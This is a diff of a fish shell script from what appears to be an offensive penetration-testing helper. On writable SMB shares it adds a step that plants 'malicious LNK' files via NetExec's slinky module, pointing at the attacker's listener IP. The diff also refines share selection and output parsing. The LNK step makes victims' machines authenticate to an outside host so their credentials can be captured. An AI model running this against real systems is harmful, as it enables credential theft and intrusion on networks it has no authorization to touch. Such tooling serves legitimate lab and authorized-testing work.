@@ -232,11 +232,14 @@ Examples:
         }')
 
         if test -n "$write_shares"
-            ezpz_info "WRITE shares: $write_shares"
-            ezpz_question "Select LNK action:"
-            set lnk_action (ezpz_choose_one 'skip' 'create malicious LNK')
+            ezpz_header "Found writeable shares: "(string join ', ' $write_shares)
+            ezpz_question "Select follow-up action:"
+            set lnk_action (ezpz_choose_one 'Create malicious LNK file' 'Skip')
+            if test -n "$lnk_action"
+                ezpz_info "Selected: $lnk_action"
+            end
 
-            if test "$lnk_action" = 'create malicious LNK'
+            if test "$lnk_action" = 'Create malicious LNK file'
                 # Prefer tun0, fall back to wg0, then to $arch from the box env.
                 set -l listener_ip ""
                 for iface in tun0 wg0
@@ -257,9 +260,23 @@ Examples:
                     ezpz_warn "Could not determine listener IP address. Skipping LNK file creation."
                 else
                     ezpz_header "Creating malicious LNK files on WRITE shares"
-                    ezpz_cmd "nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$listener"
-                    
-                    ezpz_spin nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$listener | grep SLINKY | grep -oE '(Created.*|Error.*)'
+                    set -l slinky_shares (string join ',' $write_shares)
+                    ezpz_cmd "nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$listener SHARES=$slinky_shares"
+
+                    set -l slinky_lines (ezpz_spin nxc smb $target $nxc_auth -M slinky -o NAME='bad' SERVER=$listener SHARES=$slinky_shares \
+                        | grep -aoE 'Created LNK file on the .* share|Error.*' \
+                        | sed -E "s/Created LNK file on the (.*) share/Created 'bad.lnk' LNK file on the \\1 share/")
+                    if test -n "$slinky_lines"
+                        for line in $slinky_lines
+                            if string match -q 'Error*' -- $line
+                                ezpz_error "$line"
+                            else
+                                ezpz_info "$line"
+                            end
+                        end
+                    else
+                        ezpz_warn "No LNK file was created."
+                    end
                 end
             end
         end
@@ -284,7 +301,7 @@ Examples:
             continue
         end
 
-        ezpz_question "Select shares for spidering (x to toggle, Enter to confirm)"
+        ezpz_question "Select shares for spidering:"
         set share_options (cat $share_names_tmp)
         set choice (ezpz_choose_many $share_options)
 
